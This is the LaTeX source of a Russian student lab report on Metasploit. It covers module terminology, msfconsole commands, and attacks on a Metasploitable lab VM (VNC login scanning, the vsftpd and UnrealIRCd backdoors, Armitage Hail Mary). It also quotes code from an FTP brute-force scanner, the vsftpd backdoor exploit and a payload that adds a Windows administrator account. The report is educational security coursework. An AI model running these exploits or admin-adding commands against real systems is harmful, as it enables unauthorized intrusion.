\documentclass{article}
 \usepackage[utf8]{inputenc}
 \usepackage[russian]{babel}
 
 \title{Лабораторные работы №4 \\ Курс: Защита информации}
 \author{Воробьев Олег}
 
 \ifx\pdfoutput\undefined
 \usepackage{graphicx}
 \else
 \usepackage[pdftex]{graphicx}
 \fi
 
 \begin{document}
 	\maketitle
 	\clearpage
 	\tableofcontents
 	\clearpage
 	
 \section{Цель работы}
 Изучать metasploit и освоить навыки практического применения.
 \section{Ход работы}
 \subsection{Изучение}
 \paragraph{Используя документацию изучать базовые понятия}
 \begin{itemize}
 	\item auxiliary сканер, полчающий сведения о системе, основываясь на ее слабостях.
 	\item payload буквально "полезная нарузка". Эа программа выполняет вредоносные действия: разруршение и изменение данных, отправка ложных сообщений и т.д.
 	\item expoit - бувально, это программа, которая использует ошибки(неточности) программы для ее разрушения или управления.
 	\item shellcode - двоичный испольняемый код, обычно вызывает консоль.
 	\item nop - ассемблерная инструкция которая стопорит систему, говоря ей ничего не делать.
 	\item encoder - модули, обобщающие payload.
 \end{itemize}
 \paragraph{Запустить msfconsole и узнать список допустимых команд}
 \begin{verbatim}
 	service postgresql start
 	msfconsole
 \end{verbatim}
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr1}
 	\caption{Список команд.}
 \end{figure}
 
 \paragraph{Базовые команды search,info,load,use}
 \begin{itemize}
 	\item search - без параметров- список всех эксплоитов, с параметром поиск эксплоита.
 	\item info - полная информация о эксплоите
 	\item load - команда для загрузки плагинов
 	\item use -команда для запуска эксплоита
 \end{itemize}
 \paragraph{Команды по работе с эксплоитом}
 \begin{itemize}
 	\item show exploits - список всех доступных на данный момент эксплоитов
 	\item show options - список доступных опций для эксплоита
 	\item exploit - запуск эксплоита
 	\item rexploit - перезапуск эксплоита
 	\item set RHOST - выделяем хост в сети для атаки
 	\item set RPORT - задаем METASPLOIT пори удаленой машины для подключения фреймворка
 	\item set payload - указывается имя используемого payload'a
 	\item set LPORT - задается номер порта для payload на атакуемом сервере.
 \end{itemize}
 \paragraph{Команды по работе с бд}
 \begin{itemize}
 	\item db connect - подключение к бд
 	\item db status - проверка подключения к бд
 	\item db host - просмотр списка хостов в файле базы данных
 	\item db del host - удалить хост из бд
 \end{itemize}
 \paragraph{GUI оболоска ARMITAGE\\}
 Графческая оболоска ARMITAGE позволяет в наглядном виде представить все этапы атаки, включая сканирование узлов сети, анализ защищенности обнаруженных ресурсов, выполнение эксплоитов и получение потного контроля над системой. 
 \paragraph{GUI веб-клиент}
 Клиент доступен на порту 3790 после запуска apache.
 \subsection{Практическое задание}
 \paragraph{Подключиться к VCN серверу, получить доступ к консоли}
 \subparagraph{Просканируем порты на гостевой ос metasploitable.\\}
 Команда:
 \begin{verbatim}
 	nmap 192.168.150.3 -sV
 \end{verbatim}
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr1-5}
 	\caption{Сканирование metasploitable.}
 \end{figure}
 
 Видно, что VCN сервер располагается на порте 5900.
 
 В msfconsole воспользуемся командой:
 \begin{verbatim}
 	search "VNC (protocol 3.3)
 \end{verbatim}
  
  \begin{figure}[h!]
  	\centering
  	\includegraphics[width =\linewidth]{scr2}
  	\caption{Поиск эксплоитов vcn.}
  \end{figure}
  
  Как видно из рисунка 3 присутствуем много эксплоитов. По каждому можно получить информацию командой \verb'info <exploit_name>'
 
 \subparagraph{Воспользуемся 'auxiliary/scanner/vnc/vnc login'\\}
 
 Для этого введем команду \verb'use auxiliary/scanner/vnc/vnc_login'
 
 Установим необходимые параметры \verb'set RHOSTS 192.168.150.3'
 
 Запустим exploit - \verb'exploit'
 
  \begin{figure}[h!]
  	\centering
  	\includegraphics[width =\linewidth]{scr3}
  	\caption{Работа эксплоита.}
  \end{figure}
 
 \subparagraph{Запустим vcnviewer\\}
 Команда: \verb'vncviewer 192.168.150.3:5900'
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr4}
 	\caption{Работа vcnviewer.}
 \end{figure}
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr5}
 	\caption{Работа через vcnviewer.}
 \end{figure}
 
 \paragraph{Получить список директорий в общем доступе по протоколу SMB\\}
 \subparagraph{Переключимся на другой эксплоит.\\}
 Подкоючим новый эксплоит.
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr6}
 	\caption{Переход на новый эксплоит.}
 \end{figure}
 \subparagraph{Запустим его.\\}
 Запуск эксплоита.
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr7}
 	\caption{Работа эксплоита.}
 \end{figure}
 \paragraph{Получить консоль используя vsftpd\\}
 Для данной операции выберем auxiliary: \verb'exploit/unix/ftp/vsftpd_234_backdoor'
 
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr8}
 	\caption{Работа эксплоита.}
 \end{figure}
 
 \paragraph{Получить консоль используя уязвимость irc\\}
 Для данной операции выберем exploit: \verb'exploit/unix/irc/unreal\_ircd\_3281\_backdoor'
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr9}
 	\caption{Работа эксплоита.}
 \end{figure}
 \paragraph{Armitage Hail Mary\\}
 Запустим Armitage. Выберем в качестве жертвы хост 192.168.150.3 и в меню Attacks->Hail Mary. После запуска функция hail mary проводит ”умную” атаку. 
 \begin{figure}[h!]
 	\centering
 	\includegraphics[width =\linewidth]{scr10}
 	\caption{Работа Armitage Hail Mary.}
 \end{figure}
 
 \subsection{Изучить три файла с исходным кодом эксплойитов или служебных скриптов на ruby и описать, что в них происходит}
 
 Путь к модулям: \verb'/usr/share/metasploit-framework/modules/'.
 
 Путь к файлам фреймворка: \verb'/usr/share/metasploit-framework/metasploit/framework/'.
 
 Путь к ядру: \verb'/usr/share/metasploit-framework/msf/core'.
 
 \begin{itemize}
 	
 	\item Расмотрим модуль axuiliary для brute-force сканирования логина по протоколу ftp - \verb'auxiliary/scaner/ftp/ftp_login'.
 	
 	Путь к файлу: \verb'/usr/share/metasploit-framework/modules/auxiliary/scaner/ftp/ftp_login.rb'
 	
 	В самом начале определяются описываются зависимости от модулей:
 	
 	\begin{verbatim}
 	require 'msf/core'	# ядро msf
 	require 'metasploit/framework/credential_collection' # класс для хранения учетных данных и получения их из файла
 	require 'metasploit/framework/login_scanner/ftp' # ftp сканер
 	\end{verbatim}
 	
 	Далее следует описание класса, наследуемого от \verb'Msf::Auxiliary'.
 	
 	\begin{verbatim}
 	class Metasploit3 < Msf::Auxiliary
 	\end{verbatim}
 	
 	Затем добавляются чтобы добавить методы экземпляра класса, для этого прописываются команды include соответствующих модулей:
 	
 	\begin{verbatim}
 	include Msf::Exploit::Remote::Ftp
 	include Msf::Auxiliary::Scanner
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::AuthBrute
 	\end{verbatim}
 	
 	В методе initialize прописываются описание модуля: 
 	
 	\begin{verbatim}
 	super(
 	'Name'        => 'FTP Authentication Scanner',
 	'Description' => %q{
 	This module will test FTP logins on a range of machines and
 	report successful logins.  If you have loaded a database plugin
 	and connected to a database this module will record successful
 	logins and hosts so you can track your access.
 	},
 	'Author'      => 'todb',
 	'References'     =>
 	[
 	[ 'CVE', '1999-0502'] # Weak password
 	],
 	'License'     => MSF_LICENSE
 	)
 	\end{verbatim}
 	
 	А так же опции: 
 	
 	\begin{verbatim}
 	register_options(
 	[
 	Opt::Proxies,
 	Opt::RPORT(21),
 	OptBool.new('RECORD_GUEST', [ false, "Record anonymous/guest logins to the database", false])
 	], self.class)
 	
 	register_advanced_options(
 	[
 	OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false])
 	]
 	)
 	
 	deregister_options('FTPUSER','FTPPASS') # Can use these, but should use 'username' and 'password'
 	@accepts_all_logins = {}
 	\end{verbatim}
 	
 	Далее следует метод run\_host, который и производит сканирование. Сначала выводиться информация, что сканирование началось:
 	
 	\begin{verbatim}
 	print_status("#{ip}:#{rport} - Starting FTP login sweep")
 	\end{verbatim}
 	
 	Создаетются экземпляры учетных данных и сканера:
 	
 	\begin{verbatim}
 	cred_collection = Metasploit::Framework::CredentialCollection.new(
 	blank_passwords: datastore['BLANK_PASSWORDS'],
 	pass_file: datastore['PASS_FILE'],
 	password: datastore['PASSWORD'],
 	user_file: datastore['USER_FILE'],
 	userpass_file: datastore['USERPASS_FILE'],
 	username: datastore['USERNAME'],
 	user_as_pass: datastore['USER_AS_PASS'],
 	prepended_creds: anonymous_creds
 	)
 	
 	cred_collection = prepend_db_passwords(cred_collection)
 	
 	scanner = Metasploit::Framework::LoginScanner::FTP.new(
 	host: ip,
 	port: rport,
 	proxies: datastore['PROXIES'],
 	cred_details: cred_collection,
 	stop_on_success: datastore['STOP_ON_SUCCESS'],
 	bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
 	max_send_size: datastore['TCP::max_send_size'],
 	send_delay: datastore['TCP::send_delay'],
 	connection_timeout: 30,
 	framework: framework,
 	framework_module: self,
 	)
 	\end{verbatim}
 	
 	И непосредственно сканирование:
 	
 	\begin{verbatim}
 	scanner.scan! do |result|
 	credential_data = result.to_h
 	credential_data.merge!(
 	module_fullname: self.fullname,
 	workspace_id: myworkspace_id
 	)
 	if result.success?
 	credential_core = create_credential(credential_data)
 	credential_data[:core] = credential_core
 	create_credential_login(credential_data)
 	
 	print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"
 	else
 	invalidate_login(credential_data)
 	vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
 	end
 	end
 	\end{verbatim}
 	
 	
 	
 	\item Далее рассмотрим exploit - vsftpd\_234\_backdoor. 
 	
 	Путь: \verb'/usr/share/metasploit-framework/modules/exploit/unix/ftp/vsftd_234_backdoor.rb'.
 	
 	Здесь все аналогично, остановимся на логике эксплоита.
 	
 	Сначала происодит попытка подключения по порту 6200.
 	
 	\begin{verbatim}
 	nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
 	if nsock
 	print_status("The port used by the backdoor bind listener is already open")
 	handle_backdoor(nsock)
 	return
 	end
 	\end{verbatim}
 	
 	Далее, если сокет открыт на ftp сервер отправляется рандомный пользователь и пароль, так же осуществляются проверки на доступ только анонимным пользователям и на ответ сервера:
 	
 	\begin{verbatim}
 	sock.put("USER #{rand_text_alphanumeric(rand(6)+1)}:)\r\n")
 	resp = sock.get_once(-1, 30).to_s
 	print_status("USER: #{resp.strip}")
 	
 	if resp =~ /^530 /
 	print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
 	disconnect
 	return
 	end
 	
 	if resp !~ /^331 /
 	print_error("This server did not respond as expected: #{resp.strip}")
 	disconnect
 	return
 	end
 	
 	sock.put("PASS #{rand_text_alphanumeric(rand(6)+1)}\r\n")
 	\end{verbatim}
 	
 	Далее не получая ответа на ввод пароля просто пытаемся запустить backdoor:
 	
 	\begin{verbatim}
 	nsock = self.connect(false, {'RPORT' => 6200}) rescue nil
 	if nsock
 	print_good("Backdoor service has been spawned, handling...")
 	handle_backdoor(nsock)
 	return
 	end
 	\end{verbatim}
 	
 	Payload запускается в методе handle\_backdoor:
 	
 	\begin{verbatim}
 	def handle_backdoor(s)
 	
 	s.put("id\n")
 	
 	r = s.get_once(-1, 5).to_s
 	if r !~ /uid=/
 	print_error("The service on port 6200 does not appear to be a shell")
 	disconnect(s)
 	return
 	end
 	
 	print_good("UID: #{r.strip}")
 	
 	s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
 	handler(s)
 	end
 	\end{verbatim}
 	
 	
 	\item Рассмотрим payload - windows/adduser.
 	
 	Данный payload создает пользователя в системе windows, с заранее заданными настройками.
 	
 	Путь: \verb'/usr/share/metasploit-framework/modules/payload/singles/windows/adduser.rb'.
 	
 	Сначала прописаны опции: 
 	
 	\begin{verbatim}
 	register_options(
 	[
 	OptString.new('USER', [ true, "The username to create",     "metasploit" ]),
 	OptString.new('PASS', [ true, "The password for this user", "Metasploit$1" ]),
 	OptString.new('CUSTOM', [ false, "Custom group name to be used instead of default", '' ]),
 	OptBool.new('WMIC',	 [ true, "Use WMIC on the target to resolve administrators group", false ]),
 	], self.class)
 	register_advanced_options(
 	[
 	OptBool.new("COMPLEXITY", [ true, "Check password for complexity rules", true ]),
 	], self.class)
 	\end{verbatim}
 	Далее в зависимости от введных опций генерируется код который должен быть запущен на компьтере жертве в командной строке:
 	\begin{verbatim}
 	def command_string
 	user = datastore['USER'] || 'metasploit'
 	pass = datastore['PASS'] || ''
 	cust = datastore['CUSTOM'] || ''
 	wmic = datastore['WMIC']
 	complexity= datastore['COMPLEXITY']
 	if(pass.length > 14)
 	raise ArgumentError, "Password for the adduser payload must be 14 characters or less"
 	end
 	if complexity and pass !~ /\A^.*((?=.{8,})(?=.*[a-z])(?=.*[A-Z])(?=.*[\d\W])).*$/
 	raise ArgumentError, "Password: #{pass} doesn't meet complexity requirements and may cause issues"
 	end
 	
 	if not cust.empty?
 	print_status("Using custom group name #{cust}")
 	return "cmd.exe /c net user #{user} #{pass} /ADD && " +
 	"net localgroup \"#{cust}\" #{user} /ADD"
 	elsif wmic
 	print_status("Using WMIC to discover the administrative group name")
 	return "cmd.exe /c \"FOR /F \"usebackq tokens=2* skip=1 delims==\" " +
 	"%G IN (`wmic group where sid^='S-1-5-32-544' get name /Value`); do " +
 	"FOR /F \"usebackq tokens=1 delims==\" %X IN (`echo %G`); do " +
 	"net user #{user} #{pass} /ADD && " +
 	"net localgroup \"%X\" #{user} /ADD\""
 	else
 	return "cmd.exe /c net user #{user} #{pass} /ADD && " +
 	"net localgroup Administrators #{user} /ADD"
 	end
 	
 	end
 	\end{verbatim}
 	
 	
 	
 \end{itemize}
 
 \section{Вывод}
 
 После выполнения работы были изучены основные принципы работы с metasploit-framework, в основном через интерфейс msfconsole. Так же пришлось поработать через интерфейс armitage. С практической стороны были изучены методы сканирования хостов и получения к ним доступа, рассмотрены типичные атаки. Изучены основы работы с эксплоитами и код некоторых модулей.
 
 
 \end{document}